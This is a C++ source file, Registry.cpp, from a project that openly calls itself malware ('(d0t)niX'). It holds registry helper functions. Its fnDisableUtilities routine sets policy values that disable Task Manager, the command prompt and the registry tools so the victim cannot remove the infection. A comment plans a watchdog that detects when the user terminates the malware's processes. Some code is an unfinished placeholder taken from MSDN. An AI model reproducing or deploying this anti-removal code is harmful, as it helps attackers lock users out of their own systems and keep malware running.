/*-----------------------------------------------------+---------------------------\
 |    ___    __________   __  ___          ______  ___ | __________                |
 |   /  / __| _/\   _  \_/  |_\  \   ____ |__\   \/  / | \______   \ ____   ____   |
 |  /  / / __ | /  / \  \   __\\  \ /    \|  |\     /  |  |       _// __ \ / ___\  |
 | (  ( / /_/ | \  \_/   \  |   )  )   |  \  |/     \  |  |    |   \  ___// /_/  > |
 |  \  \\____ |  \_____  /__|  /  /|___|  /__/___/\  \ |  |____|_  /\___  >___  /  |
 |   \__\    \/        \/     /__/      \/         \_/ |         \/     \/_____/   |
 +-----------------------------------------------+-----+---------------------------/
 | Registry.cpp :: (d0t)niX's Registry Functions |
 \-----------------------------------------------*/

#include "../../Header-Files/pch.h"
#include "../../Header-Files/(d0t)niX.h"

// TODO: needs to be modified and improved for watchdog use
BOOL fnCheckRegistryKeyW(
	_In_ LPCWSTR lpSubKey
) {
	HKEY hKey;
	LSTATUS lsRKey = RegOpenKeyEx(HKEY_LOCAL_MACHINE, lpSubKey, 0, KEY_READ | KEY_WOW64_32KEY, &hKey);
	if (!lsRKey) {
		RegCloseKey(hKey);
		return TRUE;
	} else {
		SetLastError(lsRKey);
		fnMessageHandlerW(std::wstring{ szMALWR_NAME + (std::wstring)L" (HKLM)" }.c_str(), L"Couldn't Open Registry Key",
			L"RegOpenKeyExW", MB_ICONWARNING);
	}

	// If HKLM can't be read try HKCU
	lsRKey = RegOpenKeyEx(HKEY_CURRENT_USER, lpSubKey, 0, KEY_READ | KEY_WOW64_32KEY, &hKey);
	if (!lsRKey) {
		RegCloseKey(hKey);
		return TRUE;
	} else {
		SetLastError(lsRKey);
		fnMessageHandlerW(std::wstring{ szMALWR_NAME + (std::wstring)L" (HKCU)" }.c_str(), L"Couldn't Open Registry Key",
			L"RegOpenKeyExW", MB_ICONERROR);
	}

	RegCloseKey(hKey);
	return FALSE;
}

// TODO: modify this in order to be compatible with REG_SZ Values (needed for regestry monitoring)
BOOL fnCreateRegistryKeyW(
	_In_     HKEY    hKeyHK,
	_In_     LPCWSTR lpSubKey,
	_In_     BOOL    bWow32,
	_In_opt_ LPCWSTR lpValueName,
	_In_opt_ DWORD   dwType,
	_In_opt_ DWORD   dwValue
) {
	REGSAM _wow32;
	if (bWow32) {
		_wow32 = KEY_WOW64_32KEY;
	} else {
		_wow32 = NULL;
	}

	HKEY hKey;
	if (!RegCreateKeyEx(hKeyHK, lpSubKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | _wow32, NULL, &hKey, NULL)) {
		if (lpValueName) {
			if (!RegSetValueEx(hKey, lpValueName, 0, dwType, (LPBYTE)&dwValue, sizeof(DWORD))) {
				RegCloseKey(hKey);
				return TRUE;
			} else {
				fnMessageHandlerW(NULL, L"Couldn't set Registry Type/Value\nType: %d\nValue: %s 0x%X", L"RegSetValueExW",
					MB_ICONWARNING, dwType, lpValueName, dwValue);
			}
		}
	} else {
		fnMessageHandlerW(NULL, L"Couldn't create Registry Key\nKey: %s", L"RegCreateKeyExW", MB_ICONWARNING, lpSubKey);
	}

	RegCloseKey(hKey);
	return FALSE;
}

// TODO: finish this (salvage code from the functions above)
BOOL fnDeleteRegistryKeyW(
	_In_     HKEY    hKeyHK,
	_In_     LPCWSTR lpSubKey,
	_In_     BOOL    bWow32,
	_In_opt_ LPCWSTR lpValueName,
	_In_opt_ DWORD   dwType,
	_In_opt_ DWORD   dwValue
) {


	return FALSE;
}

#if PROTECTIONS == TRUE
// TODO: improve this (forloop and arrays)
BOOL fnDisableUtilities(VOID) {
	if (!fnCreateRegistryKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
		FALSE, L"DisableTaskMgr", REG_DWORD, 0x1)) {
	}
	if (!fnCreateRegistryKeyW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
		FALSE, L"DisableTaskMgr", REG_DWORD, 0x1)) {
	}

	if (!fnCreateRegistryKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
		FALSE, L"DisableCMD", REG_DWORD, 0x2)) {
	}
	if (!fnCreateRegistryKeyW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
		FALSE, L"DisableCMD", REG_DWORD, 0x2)) {
	}

	if (!fnCreateRegistryKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
		FALSE, L"DisableRegistryTools", REG_DWORD, 0x2)) {
	}
	if (!fnCreateRegistryKeyW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
		FALSE, L"DisableRegistryTools", REG_DWORD, 0x2)) {
	}

	return TRUE;
}
#endif // PROTECTIONS


// Placeholder (ripped from msdn, will be modified)
/* this will be used to monitor registry keys and values
 *
 * The intended usage is to use this for an watchdog thread,
 * that monitors the active processes and the registry tree.
 *
 * The way it will work is that the watchdog will enumerate Random REG_SZ values under the malware's SubKey
 * (created by the /exec processes on startup, these regkey's will also be deleted when the process exits normally)
 * ...containing the name of the executable.
 * If it finds such value it will pass that value to a Processmonitor that will look if a process with this name is running.
 *
 * If a process with this name is found the Malware will continue.
 * If the process isn't found it will check if the RegistryValue still exist incase that the process just terminated by itself.
 *
 * If the Value isn't found anymore the malware will continue like normally,
 * if else the watchdog knows that a process was terminated abnormally (likely by the user) and will respond corespondingly.
 */
#define MAX_KEY_LENGTH 255
#define MAX_VALUE_NAME 16383

void QueryKey(HKEY hKey) {
	TCHAR    achKey[MAX_KEY_LENGTH];   // buffer for subkey name
	DWORD    cbName;                   // size of name string
	TCHAR    achClass[MAX_PATH] = TEXT("");  // buffer for class name
	DWORD    cchClassName = MAX_PATH;  // size of class string
	DWORD    cSubKeys = 0;               // number of subkeys
	DWORD    cbMaxSubKey;              // longest subkey size
	DWORD    cchMaxClass;              // longest class string
	DWORD    cValues;              // number of values for key
	DWORD    cchMaxValue;          // longest value name
	DWORD    cbMaxValueData;       // longest value data
	DWORD    cbSecurityDescriptor; // size of security descriptor
	FILETIME ftLastWriteTime;      // last write time

	DWORD i, retCode;

	TCHAR  achValue[MAX_VALUE_NAME];
	DWORD cchValue = MAX_VALUE_NAME;

	// Get the class name and the value count.
	retCode = RegQueryInfoKey(
		hKey,                    // key handle
		achClass,                // buffer for class name
		&cchClassName,           // size of class string
		NULL,                    // reserved
		&cSubKeys,               // number of subkeys
		&cbMaxSubKey,            // longest subkey size
		&cchMaxClass,            // longest class string
		&cValues,                // number of values for this key
		&cchMaxValue,            // longest value name
		&cbMaxValueData,         // longest value data
		&cbSecurityDescriptor,   // security descriptor
		&ftLastWriteTime);       // last write time

	// Enumerate the subkeys, until RegEnumKeyEx fails.

	if (cSubKeys) {
		printf("\nNumber of subkeys: %d\n", cSubKeys);

		for (i = 0; i < cSubKeys; i++) {
			cbName = MAX_KEY_LENGTH;
			retCode = RegEnumKeyEx(hKey, i,
				achKey,
				&cbName,
				NULL,
				NULL,
				NULL,
				&ftLastWriteTime);
			if (retCode == ERROR_SUCCESS) {

			}
		}
	}

	// Enumerate the key values.

	if (cValues) {
		printf("\nNumber of values: %d\n", cValues);

		for (i = 0, retCode = ERROR_SUCCESS; i < cValues; i++) {
			cchValue = MAX_VALUE_NAME;
			achValue[0] = '\0';
			retCode = RegEnumValue(hKey, i,
				achValue,
				&cchValue,
				NULL,
				NULL,
				NULL,
				NULL);

			if (retCode == ERROR_SUCCESS) {

			}
		}
	}
}